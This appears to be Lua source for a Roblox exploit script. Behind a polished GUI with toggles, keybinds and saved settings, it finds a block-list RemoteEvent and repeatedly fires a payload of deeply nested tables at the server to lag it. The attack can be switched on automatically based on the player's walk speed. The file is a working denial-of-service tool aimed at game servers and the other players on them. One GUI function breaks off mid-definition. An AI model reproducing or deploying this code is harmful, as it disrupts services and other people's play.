local function resolveKb(name)
	if not name or name == "" or name == "None" then return nil end
	local ok, val = pcall(function() return Enum.KeyCode[name] end)
	return ok and val or nil
end
local function saveConfig()
	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
	if ok and encoded and writefile then pcall(writefile, CONFIG_FILE, encoded) end
end
local function loadConfig()
	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
	if not ok or type(data) ~= "table" then return end
	cfg.power = tonumber(data.power) or DEFAULT_CFG.power
	cfg.interval = tonumber(data.interval) or DEFAULT_CFG.interval
	cfg.keybindKb = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
	cfg.keybindGp = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
	cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
	cfg.bgIndex = tonumber(data.bgIndex) or DEFAULT_CFG.bgIndex
	cfg.uiScale = tonumber(data.uiScale) or DEFAULT_CFG.uiScale
	if cfg.bgIndex < 1 or cfg.bgIndex > #BACKGROUNDS then cfg.bgIndex = 1 end
	if type(data.mode) == "string" and (MODES[data.mode] or data.mode == "CUSTOM") then
		cfg.mode = data.mode
	else
		cfg.mode = DEFAULT_CFG.mode
	end
end

local function addRotatingGradient(stroke)
	local grad = Instance.new("UIGradient")
	grad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0,   C.accentBr),
		ColorSequenceKeypoint.new(0.3, C.accentDim),

local function addHover(btn, stroke, enterFn, leaveFn)
	btn.MouseEnter:Connect(function()
		pcall(playSound, S.hover, 0.15, 1.1)
		if stroke then tw(stroke, {Transparency = 0.1}, 0.1) end
		if enterFn then enterFn() end
	end)
	btn.MouseLeave:Connect(function()
		if stroke then tw(stroke, {Transparency = 0.55}, 0.15) end
		if leaveFn then leaveFn() end
	end)
	btn.MouseButton1Down:Connect(function() pcall(playSound, S.click, 0.25, 1) end)
end

local function makeToggle(parent, defaultState, callback, sizeX, sizeY)
	sizeX = sizeX or 34
	sizeY = sizeY or 18
	local container = Instance.new("TextButton")
	container.Size = UDim2.new(0, sizeX, 0, sizeY)
	container.BackgroundColor3 = C.off
	container.BorderSizePixel = 0
	container.Text = ""
	container.AutoButtonColor = false
	container.ZIndex = 8
	container.Parent = parent
	makeCorner(container, sizeY/2)

	local stroke = Instance.new("UIStroke")
	stroke.Thickness = 1
	stroke.Color = C.dim
	stroke.Transparency = 0.4
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Parent = container

	local knob = Instance.new("Frame")
	knob.Size = UDim2.new(0, sizeY - 4, 0, sizeY - 4)
	knob.Position = UDim2.new(0, 2, 0.5, -(sizeY - 4)/2)
	knob.BackgroundColor3 = Color3.fromRGB(200, 215, 235)
	knob.BorderSizePixel = 0
	knob.ZIndex = 9
	knob.Parent = container
	makeCorner(knob, (sizeY - 4)/2)

	local state = defaultState and true or false
	local function render(init)
		local dur = init and 0 or 0.18
		if state then
			tw(container, {BackgroundColor3 = C.accent}, dur)
			tw(stroke, {Color = C.accentBr, Transparency = 0}, dur)
			tw(knob, {
				Position = UDim2.new(1, -(sizeY-4) - 2, 0.5, -(sizeY-4)/2),
				BackgroundColor3 = Color3.fromRGB(255,255,255)
			}, dur, Enum.EasingStyle.Quart)
		else
			tw(container, {BackgroundColor3 = C.off}, dur)
			tw(stroke, {Color = C.dim, Transparency = 0.4}, dur)
			tw(knob, {
				Position = UDim2.new(0, 2, 0.5, -(sizeY-4)/2),
				BackgroundColor3 = Color3.fromRGB(200, 215, 235)
			}, dur, Enum.EasingStyle.Quart)
		end
	end
	render(true)

	container.MouseButton1Click:Connect(function()
		state = not state
		pcall(playSound, S.click)
		render(false)
		if callback then callback(state) end
	end)

	addHover(container, stroke)

	return {
		Frame = container,
		SetState = function(self, v, noCb)
			state = v and true or false
			render(false)
			if not noCb and callback then callback(state) end
		end,
		GetState = function() return state end,
	}
end

local function spawnDot()
	if isMinimized then return end
	local s = math.random(2,3)
	local d = Instance.new("Frame")
	d.Size = UDim2.new(0,s,0,s)
	d.Position = UDim2.new(math.random(),0,-0.02,0)
	d.BackgroundColor3 = C.accentBr
	d.BackgroundTransparency = 0.3 + math.random()*0.4
	d.BorderSizePixel = 0
	d.ZIndex = 2
	d.Parent = particleLayer
	makeCorner(d, s)
	local dur = 3.5 + math.random()*3
	local ex = d.Position.X.Scale + (math.random()-0.5)*0.1
	TweenService:Create(d, TweenInfo.new(dur, Enum.EasingStyle.Linear), {
		Position = UDim2.new(ex,0,1.05,0),
		BackgroundTransparency = 1
	}):Play()
	task.delay(dur+0.1, function() if d then d:Destroy() end end)
end

local function makeDraggable(frame, handle)
	local dragging, ds, sp
	handle.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			dragging = true; ds = i.Position; sp = frame.Position
		end
	end)
	handle.InputChanged:Connect(function(i)
		if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
			local d = i.Position - ds
			frame.Position = UDim2.new(sp.X.Scale, sp.X.Offset+d.X, sp.Y.Scale, sp.Y.Offset+d.Y)
		end
	end)
	UserInputService.InputEnded:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
end

local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	local rem
	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
		local r = rrs:FindFirstChild(name)
		if r and r:IsA("RemoteEvent") then rem = r break end
	end
	if not rem then
		for _, c in ipairs(rrs:GetChildren()) do
			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
		end
	end
	return rem
end
remote = findRemote()

local function buildPayload(power)
	local main = {}
	local nested = {{}}
	local current = nested[1]
	for _ = 1, 186 do
		local n = {}
		table.insert(current, n)
		current = n
	end
	local maxRep = math.min(math.floor(power / 188), 10000)
	for _ = 1, maxRep do
		table.insert(main, nested)
	end
	return main
end

local function runPingLoop()
	local delay = cfg.interval
	local cachedPayload = buildPayload(cfg.power)
	while active and remote do
		local ok = pcall(function() remote:FireServer(cachedPayload) end)
		if not ok then
			delay = math.min(delay * 1.5, 0.5)
		else
			delay = math.max(delay * 0.995, 0.05)
		end
		task.wait(delay)
	end
end

function flipLag(state)
	active = state
	if active then
		if not remote then
			remote = findRemote()
			if not remote then
				active = false
				setActiveVisual(false)
				mainToggle:SetState(false, true)
				return
			end
		end
		pcall(playSound, S.activate, 0.45)
		setActiveVisual(true)
		mainToggle:SetState(true, true)
		task.spawn(runPingLoop)
	else
		pcall(playSound, S.deactivate, 0.35)
		setActiveVisual(false)
		mainToggle:SetState(false, true)
	end
end

RunService.Heartbeat:Connect(function()
	if not cfg.autoBrainrot then
		if brainrotMode then
			brainrotMode = false
			lastBrainrotState = false
			if active then flipLag(false) end
		end
		return
	end
	local char = plr.Character

	local hum = char:FindFirstChild("Humanoid")
	if not hum then return end
	local currentSpeed = hum.WalkSpeed
	local hasBrainrot = (currentSpeed > 7 and currentSpeed < 32)
	if hasBrainrot and not lastBrainrotState then
		if tick() - lastToggleTime > 0.3 then
			lastToggleTime = tick()
			brainrotMode = true
			lastBrainrotState = true
			if not active then flipLag(true) end
		end
	elseif not hasBrainrot and lastBrainrotState then
		if tick() - lastToggleTime > 1.0 then
			lastToggleTime = tick()
			brainrotMode = false
			lastBrainrotState = false
			if active then flipLag(false) end
		end
	end
end)

UserInputService.InputBegan:Connect(function(input, processed)
	if listeningFor then
		if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
			if listeningFor == "kb" then
				cfg.keybindKb = input.KeyCode.Name
			elseif listeningFor == "gp" then
				cfg.keybindGp = input.KeyCode.Name
			end
			listeningFor = nil
			updateKbLabels()
			saveConfig()
			pcall(playSound, S.activate)
		elseif input.KeyCode == Enum.KeyCode.Escape then
			listeningFor = nil
			updateKbLabels()
		end
		return
	end
	if processed then return end
	if input.UserInputType == Enum.UserInputType.Keyboard then
		local kbEnum = resolveKb(cfg.keybindKb)
		local gpEnum = resolveKb(cfg.keybindGp)
		if kbEnum and input.KeyCode == kbEnum then
			flipLag(not active)
		end
		if gpEnum and input.KeyCode == gpEnum then
			mainFrame.Visible = not mainFrame.Visible
			pcall(playSound, S.click)
		end
	end
end)
